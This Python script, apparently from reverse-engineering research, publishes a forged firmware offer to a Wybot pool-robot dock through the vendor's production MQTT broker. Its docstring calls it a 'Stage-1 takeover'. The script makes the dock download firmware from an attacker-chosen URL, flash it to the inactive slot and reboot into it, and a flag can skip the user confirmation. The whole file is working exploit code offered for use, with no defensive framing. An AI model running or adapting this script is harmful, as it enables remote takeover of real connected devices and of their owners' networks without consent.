#!/usr/bin/env python3
"""
Stage-1 takeover (the WORKING path): publish a forged firmware OFFER on
/device/OTA/reply_all_firmware_info/<id>. The dock's parser (FUN_420111aa) stores it as the
board's OFFERED version; because offered > installed for a hardwareVer-matched board, the OTA
tick's trigger guard selects the board and the orchestrator downloads our url, md5-verifies, and
esp_ota-writes the inactive slot, then reboots into it.

(This supersedes ota_push.py's recv_start_update approach, which never set `offered` and so never
triggered.)

Subscribes to the dock's OTA topics first, publishes the offer, then streams events.

    export WYBOT_MQTT_HOST=mqtt.wybotpool.com WYBOT_MQTT_PORT=1883
    export WYBOT_MQTT_USER=... WYBOT_MQTT_PASS=...
    python3 ota_arm.py --device <id> --url http://<ip>:8099/firmware.ota.bin --md5 <hex> \
        --hwver 5.127.0 --swver 2.2.21 --model DS20 [--seconds 240] [--dry-run]
"""
import asyncio, os, sys, time, argparse, json

async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--device", required=True)
    ap.add_argument("--url", required=True)
    ap.add_argument("--md5", required=True)
    ap.add_argument("--hwver", required=True, help="MUST equal the board's installed hardwareVer exactly")
    ap.add_argument("--swver", required=True, help="MUST be > installed softwareVer")
    ap.add_argument("--model", default="DS20")
    ap.add_argument("--board", default="iot")
    ap.add_argument("--seconds", type=float, default=240)
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--manual", type=int, default=1, help="manual-flag 0=auto(no confirm) 1=needs confirm")
    args = ap.parse_args()
    if len(args.md5) != 32:
        sys.exit(f"md5 must be exactly 32 hex chars (got {len(args.md5)})")

    entry = {
        "id": 1, "boardID": args.board, "productModel": args.model, "chipType": "",
        "softwareVer": args.swver, "hardwareVer": args.hwver,
        "url": args.url, "md5": args.md5, "manual": args.manual,
        "target": "0.0.0", "dependency": "", "enforce": True, "Create": 0,
    }
    payload = json.dumps({"firmware": [entry]}, separators=(",", ":"))
    topic = f"/device/OTA/reply_all_firmware_info/{args.device}"
    print(f"OFFER topic:   {topic}")
    print(f"OFFER payload: {payload}")
    if args.dry_run:
        print("dry-run: not connecting/publishing"); return

    host = os.environ.get("WYBOT_MQTT_HOST", "mqtt.wybotpool.com")
    port = int(os.environ.get("WYBOT_MQTT_PORT", "1883"))
    user, pw = os.environ.get("WYBOT_MQTT_USER"), os.environ.get("WYBOT_MQTT_PASS")
    if not (user and pw):
        sys.exit("Set WYBOT_MQTT_USER / WYBOT_MQTT_PASS.")
    import aiomqtt

    watch = [f"/device/OTA/{t}/{args.device}" for t in (
        "post_update_progress", "post_errcode", "recv_start_update",
        "notify_ready_to_update", "notify_ready_to_update_reply",
        "request_all_firmware_info", "reply_all_firmware_info", "reply_request_all_firmware_info")]

    async with aiomqtt.Client(hostname=host, port=port, username=user, password=pw,
                              identifier=f"ota-arm-{int(time.time())}-{os.getpid()}") as c:
        for t in watch:
            await c.subscribe(t)
        print(f"[{time.strftime('%H:%M:%S')}] subscribed to {len(watch)} dock OTA topics")
        await asyncio.sleep(1.5)
        await c.publish(topic, payload.encode())
        print(f"[{time.strftime('%H:%M:%S')}] >>> OFFER PUBLISHED <<<", flush=True)

        async def pump():
            async for m in c.messages:
                raw = m.payload.decode(errors="replace")
                kind = str(m.topic).split("/")[3]
                try:
                    raw = json.dumps(json.loads(raw), separators=(",", ":"))
                except Exception:
                    pass
                print(f"[{time.strftime('%H:%M:%S')}] <{kind}> {raw[:500]}", flush=True)
        try:
            await asyncio.wait_for(pump(), timeout=args.seconds)
        except asyncio.TimeoutError:
            pass
    print(f"[{time.strftime('%H:%M:%S')}] watch window ended")

if __name__ == "__main__":
    asyncio.run(main())
